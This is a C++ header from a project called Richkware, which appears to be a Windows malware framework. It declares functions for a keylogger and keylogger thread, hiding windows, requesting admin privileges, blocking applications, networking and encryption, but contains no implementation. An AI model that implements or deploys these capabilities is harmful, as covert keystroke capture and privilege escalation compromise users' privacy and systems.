/*
*      Copyright 2016 Riccardo Melioli. All Rights Reserved.
*/

#ifndef RICHKWARE_H_
#define RICHKWARE_H_

#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <winbase.h>
#include <winreg.h>
#include <winuser.h>

#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <string.h>
#include <cstring>
#include <string>
#include <iterator>
#include <list>

#include "crypto.h"
#include "blockApps.h"
#include "network.h"
#include "storage.h"

class Richkware {
private:
	std::string appName;
public:
	const char* encryptionKey;
	BlockApps blockApps;
	Network network;
	Session session;
	SystemStorage systemStorage;

	Richkware(const char* AppNameArg, const char* EncryptionKeyArg);

	BOOL IsAdmin();
	void RequestAdminPrivileges();

	void StealthWindow(const char* window);
	void OpenApp(const char* app);
	void Keylogger(const char* fileName);

	void Hibernation();
	void RandMouse();

};

DWORD WINAPI KeyloggerThread(void* arg);

#endif /* RICHKWARE_H_ */
